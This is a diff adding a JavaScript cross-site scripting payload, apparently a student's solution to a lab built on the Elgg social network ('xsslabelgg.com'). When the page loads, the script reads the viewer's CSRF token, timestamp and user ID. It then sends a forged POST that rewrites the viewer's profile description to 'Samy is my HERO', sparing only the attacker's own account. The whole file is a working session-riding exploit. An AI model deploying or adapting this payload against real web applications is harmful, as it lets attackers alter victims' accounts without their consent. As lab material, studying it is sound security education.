@@ -1,0 +1,30 @@
+<script type="text/javascript">
+window.onload = function() {
+
+    var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
+    
+    // Retrieve data
+    var ts = elgg.security.token.__elgg_ts;
+    var token = elgg.security.token.__elgg_token;
+    var userName = elgg.session.user.name;
+    var userGuid = elgg.session.user.guid;
+    
+    // Make the post
+    var content = "__elgg_token=" + token +
+                  "&__elgg_ts=" + ts +
+                  "&name=" + userName +
+                  "&description=<p>Samy is my HERO (added by Francis Reyes)</p>" +
+                  "&accesslevel[description]=2" +
+                  "&guid=" + userGuid;
+
+    // This prevents Samy's profile from getting changed
+    if (userGuid != 47) 
+    {
+        var Ajax = new XMLHttpRequest();
+        Ajax.open("POST", sendurl, true);
+        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
+        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        Ajax.send(content);
+    }
+}
+</script>
